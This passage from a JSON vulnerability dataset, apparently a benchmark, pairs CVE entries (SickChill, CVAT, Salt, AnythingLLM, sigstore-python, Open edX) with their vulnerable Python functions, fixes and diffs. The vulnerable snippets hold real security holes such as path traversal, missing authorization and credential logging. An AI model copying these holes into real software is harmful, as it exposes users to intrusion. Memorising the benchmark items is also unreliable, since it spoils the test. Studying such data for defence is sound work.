        "end_line": 31,
        "snippet": "    def post(self, next_=None):\n        notifiers.notify_login(self.request.remote_ip)\n        global login_error\n\n        if self.get_body_argument(\"username\", None) == settings.WEB_USERNAME and self.get_body_argument(\"password\", None) == settings.WEB_PASSWORD:\n            login_error = \"\"\n            remember_me = config.checkbox_to_value(self.get_body_argument(\"remember_me\", \"0\"))\n            self.set_secure_cookie(\"sickchill_user\", settings.API_KEY, expires_days=(None, 30)[remember_me])\n            logger.info(_(\"User logged into the SickChill web interface\"))\n        else:\n            logger.warning(_(\"User attempted a failed login to the SickChill web interface from IP: \") + self.request.remote_ip)\n            login_error = _(\"Incorrect username or password! Both username and password are case sensitive!\")\n\n        self.redirect(\"/\" + settings.DEFAULT_PAGE + \"/\")"
      }
    ],
    "vul_patch": "--- a/sickchill/views/authentication.py\n+++ b/sickchill/views/authentication.py\n@@ -11,5 +11,4 @@\n             logger.warning(_(\"User attempted a failed login to the SickChill web interface from IP: \") + self.request.remote_ip)\n             login_error = _(\"Incorrect username or password! Both username and password are case sensitive!\")\n \n-        next_ = self.get_query_argument(\"next\", next_)\n-        self.redirect(next_ or \"/\" + settings.DEFAULT_PAGE + \"/\")\n+        self.redirect(\"/\" + settings.DEFAULT_PAGE + \"/\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-45393",
    "cve_description": "Computer Vision Annotation Tool (CVAT) is an interactive video and image annotation tool for computer vision. An attacker with a CVAT account can access webhook delivery information for any webhook registered on the CVAT instance, including that of other users. For each delivery, this contains information about the event that caused the delivery, typically including full details about the object on which an action was performed (such as the task for an \"update:task\" event), and the user who performed the action. In addition, the attacker can redeliver any past delivery of any webhook, and trigger a ping event for any webhook. Upgrade to CVAT 2.18.0 or any later version.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      }
    },
    "repo": "https://github.com/cvat-ai/cvat",
    "patch_url": [
      "https://github.com/cvat-ai/cvat/commit/0fafb797fdf022fb83ce81c6405ba19b583a236f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_109_1",
        "commit": "88ce0a4",
        "file_path": "cvat/apps/webhooks/permissions.py",
        "start_line": 52,
        "end_line": 72,
        "snippet": "    def get_scopes(request, view, obj):\n        Scopes = __class__.Scopes\n        scope = {\n            ('create', 'POST'): Scopes.CREATE,\n            ('destroy', 'DELETE'): Scopes.DELETE,\n            ('partial_update', 'PATCH'): Scopes.UPDATE,\n            ('update', 'PUT'): Scopes.UPDATE,\n            ('list', 'GET'): Scopes.LIST,\n            ('retrieve', 'GET'): Scopes.VIEW,\n        }.get((view.action, request.method))\n\n        scopes = []\n        if scope == Scopes.CREATE:\n            webhook_type = request.data.get('type')\n            if webhook_type in [m.value for m in WebhookTypeChoice]:\n                scope = Scopes(str(scope) + f'@{webhook_type}')\n            scopes.append(scope)\n        elif scope in [Scopes.UPDATE, Scopes.DELETE, Scopes.LIST, Scopes.VIEW]:\n            scopes.append(scope)\n\n        return scopes"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_109_1",
        "commit": "0fafb79",
        "file_path": "cvat/apps/webhooks/permissions.py",
        "start_line": 52,
        "end_line": 76,
        "snippet": "    def get_scopes(request, view, obj):\n        Scopes = __class__.Scopes\n        scope = {\n            ('create', 'POST'): Scopes.CREATE,\n            ('destroy', 'DELETE'): Scopes.DELETE,\n            ('partial_update', 'PATCH'): Scopes.UPDATE,\n            ('update', 'PUT'): Scopes.UPDATE,\n            ('list', 'GET'): Scopes.LIST,\n            ('retrieve', 'GET'): Scopes.VIEW,\n            ('ping', 'POST'): Scopes.UPDATE,\n            ('deliveries', 'GET'): Scopes.VIEW,\n            ('retrieve_delivery', 'GET'): Scopes.VIEW,\n            ('redelivery', 'POST'): Scopes.UPDATE,\n        }.get((view.action, request.method))\n\n        scopes = []\n        if scope == Scopes.CREATE:\n            webhook_type = request.data.get('type')\n            if webhook_type in [m.value for m in WebhookTypeChoice]:\n                scope = Scopes(str(scope) + f'@{webhook_type}')\n            scopes.append(scope)\n        elif scope in [Scopes.UPDATE, Scopes.DELETE, Scopes.LIST, Scopes.VIEW]:\n            scopes.append(scope)\n\n        return scopes"
      }
    ],
    "vul_patch": "--- a/cvat/apps/webhooks/permissions.py\n+++ b/cvat/apps/webhooks/permissions.py\n@@ -7,6 +7,10 @@\n             ('update', 'PUT'): Scopes.UPDATE,\n             ('list', 'GET'): Scopes.LIST,\n             ('retrieve', 'GET'): Scopes.VIEW,\n+            ('ping', 'POST'): Scopes.UPDATE,\n+            ('deliveries', 'GET'): Scopes.VIEW,\n+            ('retrieve_delivery', 'GET'): Scopes.VIEW,\n+            ('redelivery', 'POST'): Scopes.UPDATE,\n         }.get((view.action, request.method))\n \n         scopes = []\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-6918",
    "cve_description": "salt before 2015.5.5 leaks git usernames and passwords to the log.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/saltstack/salt",
    "patch_url": [
      "https://github.com/saltstack/salt/commit/28aa9b105804ff433d8f663b2f9b804f2b75495a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_307_1",
        "commit": "679ba5e",
        "file_path": "salt/modules/git.py",
        "start_line": 25,
        "end_line": 95,
        "snippet": "def _git_run(cmd, cwd=None, runas=None, identity=None, **kwargs):\n    '''\n    simple, throw an exception with the error message on an error return code.\n\n    this function may be moved to the command module, spliced with\n    'cmd.run_all', and used as an alternative to 'cmd.run_all'. Some\n    commands don't return proper retcodes, so this can't replace 'cmd.run_all'.\n    '''\n    env = {}\n\n    if identity:\n        stderrs = []\n\n        # if the statefile provides multiple identities, they need to be tried\n        # (but also allow a string instead of a list)\n        if not isinstance(identity, list):\n            # force it into a list\n            identity = [identity]\n\n        # try each of the identities, independently\n        for id_file in identity:\n            env = {\n                'GIT_IDENTITY': id_file\n            }\n\n            # copy wrapper to area accessible by ``runas`` user\n            # currently no suppport in windows for wrapping git ssh\n            if not utils.is_windows():\n                ssh_id_wrapper = os.path.join(utils.templates.TEMPLATE_DIRNAME,\n                                              'git/ssh-id-wrapper')\n                tmp_file = utils.mkstemp()\n                utils.files.copyfile(ssh_id_wrapper, tmp_file)\n                os.chmod(tmp_file, 0o500)\n                os.chown(tmp_file, __salt__['file.user_to_uid'](runas), -1)\n                env['GIT_SSH'] = tmp_file\n\n            try:\n                result = __salt__['cmd.run_all'](cmd,\n                                                 cwd=cwd,\n                                                 runas=runas,\n                                                 env=env,\n                                                 python_shell=False,\n                                                 **kwargs)\n            finally:\n                if 'GIT_SSH' in env:\n                    os.remove(env['GIT_SSH'])\n\n            # if the command was successful, no need to try additional IDs\n            if result['retcode'] == 0:\n                return result['stdout']\n            else:\n                stderrs.append(result['stderr'])\n\n        # we've tried all IDs and still haven't passed, so error out\n        raise CommandExecutionError(\"\\n\\n\".join(stderrs))\n\n    else:\n        result = __salt__['cmd.run_all'](cmd,\n                                         cwd=cwd,\n                                         runas=runas,\n                                         env=env,\n                                         python_shell=False,\n                                         **kwargs)\n        retcode = result['retcode']\n\n        if retcode == 0:\n            return result['stdout']\n        else:\n            raise CommandExecutionError(\n                'Command {0!r} failed. Stderr: {1!r}'.format(cmd,\n                                                             result['stderr']))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_307_1",
        "commit": "28aa9b105804ff433d8f663b2f9b804f2b75495a",
        "file_path": "salt/modules/git.py",
        "start_line": 26,
        "end_line": 99,
        "snippet": "def _git_run(cmd, cwd=None, runas=None, identity=None, **kwargs):\n    '''\n    simple, throw an exception with the error message on an error return code.\n\n    this function may be moved to the command module, spliced with\n    'cmd.run_all', and used as an alternative to 'cmd.run_all'. Some\n    commands don't return proper retcodes, so this can't replace 'cmd.run_all'.\n    '''\n    env = {}\n\n    if identity:\n        stderrs = []\n\n        # if the statefile provides multiple identities, they need to be tried\n        # (but also allow a string instead of a list)\n        if not isinstance(identity, list):\n            # force it into a list\n            identity = [identity]\n\n        # try each of the identities, independently\n        for id_file in identity:\n            env = {\n                'GIT_IDENTITY': id_file\n            }\n\n            # copy wrapper to area accessible by ``runas`` user\n            # currently no suppport in windows for wrapping git ssh\n            if not utils.is_windows():\n                ssh_id_wrapper = os.path.join(utils.templates.TEMPLATE_DIRNAME,\n                                              'git/ssh-id-wrapper')\n                tmp_file = utils.mkstemp()\n                utils.files.copyfile(ssh_id_wrapper, tmp_file)\n                os.chmod(tmp_file, 0o500)\n                os.chown(tmp_file, __salt__['file.user_to_uid'](runas), -1)\n                env['GIT_SSH'] = tmp_file\n\n            try:\n                result = __salt__['cmd.run_all'](cmd,\n                                                 cwd=cwd,\n                                                 runas=runas,\n                                                 output_loglevel='quiet',\n                                                 env=env,\n                                                 python_shell=False,\n                                                 **kwargs)\n            finally:\n                if 'GIT_SSH' in env:\n                    os.remove(env['GIT_SSH'])\n\n            # if the command was successful, no need to try additional IDs\n            if result['retcode'] == 0:\n                return result['stdout']\n            else:\n                stderr = _remove_sensitive_data(result['stderr'])\n                stderrs.append(stderr)\n\n        # we've tried all IDs and still haven't passed, so error out\n        raise CommandExecutionError(\"\\n\\n\".join(stderrs))\n\n    else:\n        result = __salt__['cmd.run_all'](cmd,\n                                         cwd=cwd,\n                                         runas=runas,\n                                         output_loglevel='quiet',\n                                         env=env,\n                                         python_shell=False,\n                                         **kwargs)\n        retcode = result['retcode']\n\n        if retcode == 0:\n            return result['stdout']\n        else:\n            stderr = _remove_sensitive_data(result['stderr'])\n            raise CommandExecutionError(\n                'Command {0!r} failed. Stderr: {1!r}'.format(cmd, stderr))"
      },
      {
        "id": "fix_py_307_2",
        "commit": "28aa9b105804ff433d8f663b2f9b804f2b75495a",
        "file_path": "salt/modules/git.py",
        "start_line": 102,
        "end_line": 106,
        "snippet": "def _remove_sensitive_data(sensitive_output):\n    '''\n        Remove HTTP user and password.\n    '''\n    return re.sub('(https?)://.*@', r'\\1://<redacted>@', sensitive_output)"
      }
    ],
    "vul_patch": "--- a/salt/modules/git.py\n+++ b/salt/modules/git.py\n@@ -38,6 +38,7 @@\n                 result = __salt__['cmd.run_all'](cmd,\n                                                  cwd=cwd,\n                                                  runas=runas,\n+                                                 output_loglevel='quiet',\n                                                  env=env,\n                                                  python_shell=False,\n                                                  **kwargs)\n@@ -49,7 +50,8 @@\n             if result['retcode'] == 0:\n                 return result['stdout']\n             else:\n-                stderrs.append(result['stderr'])\n+                stderr = _remove_sensitive_data(result['stderr'])\n+                stderrs.append(stderr)\n \n         # we've tried all IDs and still haven't passed, so error out\n         raise CommandExecutionError(\"\\n\\n\".join(stderrs))\n@@ -58,6 +60,7 @@\n         result = __salt__['cmd.run_all'](cmd,\n                                          cwd=cwd,\n                                          runas=runas,\n+                                         output_loglevel='quiet',\n                                          env=env,\n                                          python_shell=False,\n                                          **kwargs)\n@@ -66,6 +69,6 @@\n         if retcode == 0:\n             return result['stdout']\n         else:\n+            stderr = _remove_sensitive_data(result['stderr'])\n             raise CommandExecutionError(\n-                'Command {0!r} failed. Stderr: {1!r}'.format(cmd,\n-                                                             result['stderr']))\n+                'Command {0!r} failed. Stderr: {1!r}'.format(cmd, stderr))\n\n--- /dev/null\n+++ b/salt/modules/git.py\n@@ -0,0 +1,5 @@\n+def _remove_sensitive_data(sensitive_output):\n+    '''\n+        Remove HTTP user and password.\n+    '''\n+    return re.sub('(https?)://.*@', r'\\1://<redacted>@', sensitive_output)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-5832",
    "cve_description": "Improper Input Validation in GitHub repository mintplex-labs/anything-llm prior to 0.1.0.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/mintplex-labs/anything-llm",
    "patch_url": [
      "https://github.com/mintplex-labs/anything-llm/commit/18798c5b640018aaee924e0afd941705d88df92e"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_314_1",
        "commit": "d5b1f84",
        "file_path": "collector/api.py",
        "start_line": "7",
        "end_line": "13",
        "snippet": "@api.route('/process', methods=['POST'])\ndef process_file():\n  content = request.json\n  target_filename = content.get('filename')\n  print(f\"Processing {target_filename}\")\n  success, reason = process_single(WATCH_DIRECTORY, target_filename)\n  return json.dumps({'filename': target_filename, 'success': success, 'reason': reason})"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_314_1",
        "commit": "18798c5",
        "file_path": "collector/api.py",
        "start_line": "8",
        "end_line": "14",
        "snippet": "@api.route('/process', methods=['POST'])\ndef process_file():\n  content = request.json\n  target_filename = os.path.normpath(content.get('filename')).lstrip(os.pardir + os.sep)\n  print(f\"Processing {target_filename}\")\n  success, reason = process_single(WATCH_DIRECTORY, target_filename)\n  return json.dumps({'filename': target_filename, 'success': success, 'reason': reason})"
      },
      {
        "id": "fix_py_314_2",
        "commit": "18798c5",
        "file_path": "collector/api.py",
        "start_line": "1",
        "end_line": "1",
        "snippet": "import os"
      }
    ],
    "vul_patch": "--- a/collector/api.py\n+++ b/collector/api.py\n@@ -1,7 +1,7 @@\n @api.route('/process', methods=['POST'])\n def process_file():\n   content = request.json\n-  target_filename = content.get('filename')\n+  target_filename = os.path.normpath(content.get('filename')).lstrip(os.pardir + os.sep)\n   print(f\"Processing {target_filename}\")\n   success, reason = process_single(WATCH_DIRECTORY, target_filename)\n   return json.dumps({'filename': target_filename, 'success': success, 'reason': reason})\n\n--- /dev/null\n+++ b/collector/api.py\n@@ -0,0 +1 @@\n+import os\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-55655",
    "cve_description": "sigstore-python is a Python tool for generating and verifying Sigstore signatures. Versions of sigstore-python newer than 2.0.0 but prior to 3.6.0 perform insufficient validation of the \"integration time\" present in \"v2\" and \"v3\" bundles during the verification flow: the \"integration time\" is verified *if* a source of signed time (such as an inclusion promise) is present, but is otherwise trusted if no source of signed time is present. This does not affect \"v1\" bundles, as the \"v1\" bundle format always requires an inclusion promise.\n\nSigstore uses signed time to support verification of signatures made against short-lived signing keys. The impact and severity of this weakness is *low*, as Sigstore contains multiple other enforcing components that prevent an attacker who modifies the integration timestamp within a bundle from impersonating a valid signature. In particular, an attacker who modifies the integration timestamp can induce a Denial of Service, but in no different manner than already possible with bundle access (e.g. modifying the signature itself such that it fails to verify). Separately, an attacker could upload a *new* entry to the transparency service, and substitute their new entry's time. However, this would still be rejected at validation time, as the new entry's (valid) signed time would be outside the validity window of the original signing certificate and would nonetheless render the attacker auditable.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/sigstore/sigstore-python",
    "patch_url": [
      "https://github.com/sigstore/sigstore-python/commit/300b502ae99ebfaace124f1f4e422a6a669369cf"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_300_1",
        "commit": "9ee7ac2",
        "file_path": "sigstore/models.py",
        "start_line": 447,
        "end_line": 546,
        "snippet": "    def _verify(self) -> None:\n        \"\"\"\n        Performs various feats of heroism to ensure the bundle is well-formed\n        and upholds invariants, including:\n\n        * The \"leaf\" (signing) certificate is present;\n        * There is a inclusion proof present, even if the Bundle's version\n           predates a mandatory inclusion proof.\n        \"\"\"\n\n        # The bundle must have a recognized media type.\n        try:\n            media_type = Bundle.BundleType(self._inner.media_type)\n        except ValueError:\n            raise InvalidBundle(f\"unsupported bundle format: {self._inner.media_type}\")\n\n        # Extract the signing certificate.\n        if media_type in (\n            Bundle.BundleType.BUNDLE_0_3,\n            Bundle.BundleType.BUNDLE_0_3_ALT,\n        ):\n            # For \"v3\" bundles, the signing certificate is the only one present.\n            leaf_cert = load_der_x509_certificate(\n                self._inner.verification_material.certificate.raw_bytes\n            )\n        else:\n            # In older bundles, there is an entire pool (misleadingly called\n            # a chain) of certificates, the first of which is the signing\n            # certificate.\n            certs = (\n                self._inner.verification_material.x509_certificate_chain.certificates\n            )\n\n            if len(certs) == 0:\n                raise InvalidBundle(\"expected non-empty certificate chain in bundle\")\n\n            # Per client policy in protobuf-specs: the first entry in the chain\n            # MUST be a leaf certificate, and the rest of the chain MUST NOT\n            # include a root CA or any intermediate CAs that appear in an\n            # independent root of trust.\n            #\n            # We expect some old bundles to violate the rules around root\n            # and intermediate CAs, so we issue warnings and not hard errors\n            # in those cases.\n            leaf_cert, *chain_certs = [\n                load_der_x509_certificate(cert.raw_bytes) for cert in certs\n            ]\n            if not cert_is_leaf(leaf_cert):\n                raise InvalidBundle(\n                    \"bundle contains an invalid leaf or non-leaf certificate in the leaf position\"\n                )\n\n            for chain_cert in chain_certs:\n                # TODO: We should also retrieve the root of trust here and\n                # cross-check against it.\n                if cert_is_root_ca(chain_cert):\n                    _logger.warning(\n                        \"this bundle contains a root CA, making it subject to misuse\"\n                    )\n\n        self._signing_certificate = leaf_cert\n\n        # Extract the log entry. For the time being, we expect\n        # bundles to only contain a single log entry.\n        tlog_entries = self._inner.verification_material.tlog_entries\n        if len(tlog_entries) != 1:\n            raise InvalidBundle(\"expected exactly one log entry in bundle\")\n        tlog_entry = tlog_entries[0]\n\n        # Handling of inclusion promises and proofs varies between bundle\n        # format versions:\n        #\n        # * For 0.1, an inclusion promise is required; the client\n        #   MUST verify the inclusion promise.\n        #   The inclusion proof is NOT required. If provided, it might NOT\n        #   contain a checkpoint; in this case, we ignore it (since it's\n        #   useless without one).\n        #\n        # * For 0.2+, an inclusion proof is required; the client MUST\n        #   verify the inclusion proof. The inclusion prof MUST contain\n        #   a checkpoint.\n        #   The inclusion promise is NOT required; if present, the client\n        #   SHOULD verify it.\n        #\n        # Before all of this, we require that the inclusion proof be present\n        # (when constructing the LogEntry).\n        log_entry = LogEntry._from_dict_rekor(tlog_entry.to_dict())\n\n        if media_type == Bundle.BundleType.BUNDLE_0_1:\n            if not log_entry.inclusion_promise:\n                raise InvalidBundle(\"bundle must contain an inclusion promise\")\n            if not log_entry.inclusion_proof.checkpoint:\n                _logger.debug(\n                    \"0.1 bundle contains inclusion proof without checkpoint; ignoring\"\n                )\n        else:\n            if not log_entry.inclusion_proof.checkpoint:\n                raise InvalidBundle(\"expected checkpoint in inclusion proof\")\n\n        self._log_entry = log_entry"
      },
      {
        "id": "vul_py_300_2",
        "commit": "9ee7ac2",
        "file_path": "sigstore/verify/verifier.py",
        "start_line": 198,
        "end_line": 237,
        "snippet": "    def _establish_time(self, bundle: Bundle) -> List[TimestampVerificationResult]:\n        \"\"\"\n        Establish the time for bundle verification.\n\n        This method uses timestamps from two possible sources:\n        1. RFC3161 signed timestamps from a Timestamping Authority (TSA)\n        2. Transparency Log timestamps\n        \"\"\"\n        verified_timestamps = []\n\n        # If a timestamp from the timestamping service is available, the Verifier MUST\n        # perform path validation using the timestamp from the Timestamping Service.\n        if bundle.verification_material.timestamp_verification_data.rfc3161_timestamps:\n            if not self._trusted_root.get_timestamp_authorities():\n                msg = (\n                    \"no Timestamp Authorities have been provided to validate this \"\n                    \"bundle but it contains a signed timestamp\"\n                )\n                raise VerificationError(msg)\n\n            timestamp_from_tsa = self._verify_timestamp_authority(bundle)\n            if len(timestamp_from_tsa) < VERIFY_TIMESTAMP_THRESHOLD:\n                msg = (\n                    f\"not enough timestamps validated to meet the validation \"\n                    f\"threshold ({len(timestamp_from_tsa)}/{VERIFY_TIMESTAMP_THRESHOLD})\"\n                )\n                raise VerificationError(msg)\n\n            verified_timestamps.extend(timestamp_from_tsa)\n\n        # If a timestamp from the Transparency Service is available, the Verifier MUST\n        # perform path validation using the timestamp from the Transparency Service.\n        if timestamp := bundle.log_entry.integrated_time:\n            verified_timestamps.append(\n                TimestampVerificationResult(\n                    source=TimestampSource.TRANSPARENCY_SERVICE,\n                    time=datetime.fromtimestamp(timestamp, tz=timezone.utc),\n                )\n            )\n        return verified_timestamps"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_300_1",
        "commit": "300b502ae99ebfaace124f1f4e422a6a669369cf",
        "file_path": "sigstore/models.py",
        "start_line": 447,
        "end_line": 557,
        "snippet": "    def _verify(self) -> None:\n        \"\"\"\n        Performs various feats of heroism to ensure the bundle is well-formed\n        and upholds invariants, including:\n\n        * The \"leaf\" (signing) certificate is present;\n        * There is a inclusion proof present, even if the Bundle's version\n           predates a mandatory inclusion proof.\n        \"\"\"\n\n        # The bundle must have a recognized media type.\n        try:\n            media_type = Bundle.BundleType(self._inner.media_type)\n        except ValueError:\n            raise InvalidBundle(f\"unsupported bundle format: {self._inner.media_type}\")\n\n        # Extract the signing certificate.\n        if media_type in (\n            Bundle.BundleType.BUNDLE_0_3,\n            Bundle.BundleType.BUNDLE_0_3_ALT,\n        ):\n            # For \"v3\" bundles, the signing certificate is the only one present.\n            leaf_cert = load_der_x509_certificate(\n                self._inner.verification_material.certificate.raw_bytes\n            )\n        else:\n            # In older bundles, there is an entire pool (misleadingly called\n            # a chain) of certificates, the first of which is the signing\n            # certificate.\n            certs = (\n                self._inner.verification_material.x509_certificate_chain.certificates\n            )\n\n            if len(certs) == 0:\n                raise InvalidBundle(\"expected non-empty certificate chain in bundle\")\n\n            # Per client policy in protobuf-specs: the first entry in the chain\n            # MUST be a leaf certificate, and the rest of the chain MUST NOT\n            # include a root CA or any intermediate CAs that appear in an\n            # independent root of trust.\n            #\n            # We expect some old bundles to violate the rules around root\n            # and intermediate CAs, so we issue warnings and not hard errors\n            # in those cases.\n            leaf_cert, *chain_certs = [\n                load_der_x509_certificate(cert.raw_bytes) for cert in certs\n            ]\n            if not cert_is_leaf(leaf_cert):\n                raise InvalidBundle(\n                    \"bundle contains an invalid leaf or non-leaf certificate in the leaf position\"\n                )\n\n            for chain_cert in chain_certs:\n                # TODO: We should also retrieve the root of trust here and\n                # cross-check against it.\n                if cert_is_root_ca(chain_cert):\n                    _logger.warning(\n                        \"this bundle contains a root CA, making it subject to misuse\"\n                    )\n\n        self._signing_certificate = leaf_cert\n\n        # Extract the log entry. For the time being, we expect\n        # bundles to only contain a single log entry.\n        tlog_entries = self._inner.verification_material.tlog_entries\n        if len(tlog_entries) != 1:\n            raise InvalidBundle(\"expected exactly one log entry in bundle\")\n        tlog_entry = tlog_entries[0]\n\n        # Handling of inclusion promises and proofs varies between bundle\n        # format versions:\n        #\n        # * For 0.1, an inclusion promise is required; the client\n        #   MUST verify the inclusion promise.\n        #   The inclusion proof is NOT required. If provided, it might NOT\n        #   contain a checkpoint; in this case, we ignore it (since it's\n        #   useless without one).\n        #\n        # * For 0.2+, an inclusion proof is required; the client MUST\n        #   verify the inclusion proof. The inclusion prof MUST contain\n        #   a checkpoint.\n        #\n        #   The inclusion promise is NOT required if another source of signed\n        #   time (such as a signed timestamp) is present. If no other source\n        #   of signed time is present, then the inclusion promise MUST be\n        #   present.\n        #\n        # Before all of this, we require that the inclusion proof be present\n        # (when constructing the LogEntry).\n        log_entry = LogEntry._from_dict_rekor(tlog_entry.to_dict())\n\n        if media_type == Bundle.BundleType.BUNDLE_0_1:\n            if not log_entry.inclusion_promise:\n                raise InvalidBundle(\"bundle must contain an inclusion promise\")\n            if not log_entry.inclusion_proof.checkpoint:\n                _logger.debug(\n                    \"0.1 bundle contains inclusion proof without checkpoint; ignoring\"\n                )\n        else:\n            if not log_entry.inclusion_proof.checkpoint:\n                raise InvalidBundle(\"expected checkpoint in inclusion proof\")\n\n            if (\n                not log_entry.inclusion_promise\n                and not self._inner.verification_material.timestamp_verification_data.rfc3161_timestamps\n            ):\n                raise InvalidBundle(\n                    \"bundle must contain an inclusion promise or signed timestamp(s)\"\n                )\n\n        self._log_entry = log_entry"
      },
      {
        "id": "fix_py_300_2",
        "commit": "300b502ae99ebfaace124f1f4e422a6a669369cf",
        "file_path": "sigstore/verify/verifier.py",
        "start_line": 198,
        "end_line": 242,
        "snippet": "    def _establish_time(self, bundle: Bundle) -> List[TimestampVerificationResult]:\n        \"\"\"\n        Establish the time for bundle verification.\n\n        This method uses timestamps from two possible sources:\n        1. RFC3161 signed timestamps from a Timestamping Authority (TSA)\n        2. Transparency Log timestamps\n        \"\"\"\n        verified_timestamps = []\n\n        # If a timestamp from the timestamping service is available, the Verifier MUST\n        # perform path validation using the timestamp from the Timestamping Service.\n        if bundle.verification_material.timestamp_verification_data.rfc3161_timestamps:\n            if not self._trusted_root.get_timestamp_authorities():\n                msg = (\n                    \"no Timestamp Authorities have been provided to validate this \"\n                    \"bundle but it contains a signed timestamp\"\n                )\n                raise VerificationError(msg)\n\n            timestamp_from_tsa = self._verify_timestamp_authority(bundle)\n            if len(timestamp_from_tsa) < VERIFY_TIMESTAMP_THRESHOLD:\n                msg = (\n                    f\"not enough timestamps validated to meet the validation \"\n                    f\"threshold ({len(timestamp_from_tsa)}/{VERIFY_TIMESTAMP_THRESHOLD})\"\n                )\n                raise VerificationError(msg)\n\n            verified_timestamps.extend(timestamp_from_tsa)\n\n        # If a timestamp from the Transparency Service is available, the Verifier MUST\n        # perform path validation using the timestamp from the Transparency Service.\n        # NOTE: We only include this timestamp if it's accompanied by an inclusion\n        # promise that cryptographically binds it. We verify the inclusion promise\n        # itself later, as part of log entry verification.\n        if (\n            timestamp := bundle.log_entry.integrated_time\n        ) and bundle.log_entry.inclusion_promise:\n            verified_timestamps.append(\n                TimestampVerificationResult(\n                    source=TimestampSource.TRANSPARENCY_SERVICE,\n                    time=datetime.fromtimestamp(timestamp, tz=timezone.utc),\n                )\n            )\n        return verified_timestamps"
      }
    ],
    "vul_patch": "--- a/sigstore/models.py\n+++ b/sigstore/models.py\n@@ -79,8 +79,11 @@\n         # * For 0.2+, an inclusion proof is required; the client MUST\n         #   verify the inclusion proof. The inclusion prof MUST contain\n         #   a checkpoint.\n-        #   The inclusion promise is NOT required; if present, the client\n-        #   SHOULD verify it.\n+        #\n+        #   The inclusion promise is NOT required if another source of signed\n+        #   time (such as a signed timestamp) is present. If no other source\n+        #   of signed time is present, then the inclusion promise MUST be\n+        #   present.\n         #\n         # Before all of this, we require that the inclusion proof be present\n         # (when constructing the LogEntry).\n@@ -97,4 +100,12 @@\n             if not log_entry.inclusion_proof.checkpoint:\n                 raise InvalidBundle(\"expected checkpoint in inclusion proof\")\n \n+            if (\n+                not log_entry.inclusion_promise\n+                and not self._inner.verification_material.timestamp_verification_data.rfc3161_timestamps\n+            ):\n+                raise InvalidBundle(\n+                    \"bundle must contain an inclusion promise or signed timestamp(s)\"\n+                )\n+\n         self._log_entry = log_entry\n\n--- a/sigstore/verify/verifier.py\n+++ b/sigstore/verify/verifier.py\n@@ -30,7 +30,12 @@\n \n         # If a timestamp from the Transparency Service is available, the Verifier MUST\n         # perform path validation using the timestamp from the Transparency Service.\n-        if timestamp := bundle.log_entry.integrated_time:\n+        # NOTE: We only include this timestamp if it's accompanied by an inclusion\n+        # promise that cryptographically binds it. We verify the inclusion promise\n+        # itself later, as part of log entry verification.\n+        if (\n+            timestamp := bundle.log_entry.integrated_time\n+        ) and bundle.log_entry.inclusion_promise:\n             verified_timestamps.append(\n                 TimestampVerificationResult(\n                     source=TimestampSource.TRANSPARENCY_SERVICE,\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-43782",
    "cve_description": "This openedx-translations repository contains translation files from Open edX repositories to be kept in sync with Transifex. Before moving to pulling translations from the openedx-translations repository via openedx-atlas, translations in the edx-platform repository were validated using edx-i18n-tools. This validation included protection against malformed translations and translations-based script injections. Prior to this patch, the validation implemented in the openedx-translations repository did not include the same protections. The maintainer inspected the translations in the edx-platform directory of both the main and open-release/redwood.master branches of the openedx-translations repository and found no evidence of exploited translation strings.",
    "cwe_info": {
      "CWE-74": {
        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
        "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/openedx/openedx-translations",
    "patch_url": [
      "https://github.com/openedx/openedx-translations/commit/3c4093705dec99590577c4d8270ce263f7fffc5a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_155_1",
        "commit": "3108cb7",
        "file_path": "scripts/validate_translation_files.py",
        "start_line": 25,
        "end_line": 44,
        "snippet": "def validate_translation_file(po_file):\n    \"\"\"\n    Validate a translation file and return errors if any.\n\n    This function combines both stderr and stdout output of the `msgfmt` in a\n    single variable.\n    \"\"\"\n    completed_process = subprocess.run(\n        ['msgfmt', '-v', '--strict', '--check', po_file],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n    )\n\n    stdout = completed_process.stdout.decode(encoding='utf-8', errors='replace')\n    stderr = completed_process.stderr.decode(encoding='utf-8', errors='replace')\n\n    return {\n        'valid': completed_process.returncode == 0,\n        'output': f'{stdout}\\n{stderr}',\n    }"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_155_1",
        "commit": "3c40937",
        "file_path": "scripts/validate_translation_files.py",
        "start_line": 27,
        "end_line": 71,
